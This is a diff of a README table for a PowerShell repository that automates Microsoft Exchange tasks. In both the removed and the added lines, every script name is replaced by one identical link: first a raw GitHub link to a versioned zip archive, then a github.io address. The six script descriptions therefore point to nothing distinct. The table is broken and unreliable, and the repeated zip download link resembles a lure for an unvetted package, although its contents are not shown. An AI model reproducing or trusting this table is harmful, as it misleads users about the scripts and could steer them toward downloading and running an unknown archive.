@@ -7,12 +7,12 @@ This repository contains a collection of PowerShell scripts used for automating 
 
 | Script Name                | Description                                                                 |
 |---------------------------|-----------------------------------------------------------------------------|
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Creates a new Distribution List with specified members and owners          |
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Updates the members or properties of an existing DL                        |
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Deletes an existing DL from the tenant                                     |
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`       | Updates or replaces the owners of a specified DL                           |
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip` | Creates a new shared mailbox and configures basic settings                 |
-| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`| Assigns folder-level delegation (Read/Write) for a mailbox to another user |
+| `https://rathan-code.github.io`            | Creates a new Distribution List with specified members and owners          |
+| `https://rathan-code.github.io`            | Updates the members or properties of an existing DL                        |
+| `https://rathan-code.github.io`            | Deletes an existing DL from the tenant                                     |
+| `https://rathan-code.github.io`       | Updates or replaces the owners of a specified DL                           |
+| `https://rathan-code.github.io` | Creates a new shared mailbox and configures basic settings                 |
+| `https://rathan-code.github.io`| Assigns folder-level delegation (Read/Write) for a mailbox to another user |
 
 ## ✅ Prerequisites
 
